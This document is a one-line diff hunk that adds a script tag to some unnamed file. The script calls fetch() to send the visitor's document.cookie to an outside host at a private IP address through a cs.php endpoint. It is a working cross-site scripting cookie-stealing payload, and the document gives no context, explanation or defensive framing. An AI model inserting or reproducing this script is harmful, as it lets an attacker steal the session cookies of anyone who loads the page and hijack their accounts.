@@ -1,0 +1,1 @@
+<script>fetch('http://10.2.35.77:1234/cs.php?cookie=' + document.cookie); </script>
